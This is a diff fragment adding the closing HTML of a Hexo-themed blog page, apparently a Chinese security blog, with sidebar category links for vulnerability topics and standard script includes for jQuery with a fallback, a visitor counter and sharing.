+        <span class="sidebar-category-name" data-categories="中间件漏洞"><span class="iconfont-archer">&#xe60a;</span>中间件漏洞</span>
+    
+        <span class="sidebar-category-name" data-categories="逻辑漏洞"><span class="iconfont-archer">&#xe60a;</span>逻辑漏洞</span>
+    
+        <span class="sidebar-category-name" data-categories="TOP10基础漏洞"><span class="iconfont-archer">&#xe60a;</span>TOP10基础漏洞</span>
+    
+        <span class="sidebar-category-name" data-categories="Hexo"><span class="iconfont-archer">&#xe60a;</span>Hexo</span>
+    
+        <span class="sidebar-category-name" data-categories="有感而发"><span class="iconfont-archer">&#xe60a;</span>有感而发</span>
+    
+        <span class="sidebar-category-name" data-categories="密码学"><span class="iconfont-archer">&#xe60a;</span>密码学</span>
+    
+        <span class="sidebar-category-name" data-categories="数据结构"><span class="iconfont-archer">&#xe60a;</span>数据结构</span>
+    
+        <span class="sidebar-category-name" data-categories="代码审计"><span class="iconfont-archer">&#xe60a;</span>代码审计</span>
+    
+        <span class="sidebar-category-name" data-categories="操作系统"><span class="iconfont-archer">&#xe60a;</span>操作系统</span>
+    
+        <span class="sidebar-category-name" data-categories="容器技术"><span class="iconfont-archer">&#xe60a;</span>容器技术</span>
+    
+        <span class="sidebar-category-name" data-categories="运维知识"><span class="iconfont-archer">&#xe60a;</span>运维知识</span>
+    
+        <span class="sidebar-category-name" data-categories="Web-Security"><span class="iconfont-archer">&#xe60a;</span>Web-Security</span>
+    
+        <span class="sidebar-category-name" data-categories="反序列化"><span class="iconfont-archer">&#xe60a;</span>反序列化</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "m0nk3y"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
